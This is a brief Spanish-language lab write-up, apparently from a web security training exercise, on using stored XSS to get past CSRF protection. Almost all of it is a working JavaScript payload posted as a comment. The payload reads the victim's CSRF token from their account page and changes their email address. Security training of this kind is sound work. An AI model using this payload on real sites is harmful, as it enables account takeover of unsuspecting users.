# 24 Lab: Exploiting XSS to bypass CSRF defenses

1. Ejecutamos el siguiente payload en los comentarios

```sql
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=testo@testo.com')
};
</script>
```

![Untitled](24%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%2017efab5460ec8135b114c487c1fab506/Untitled.png)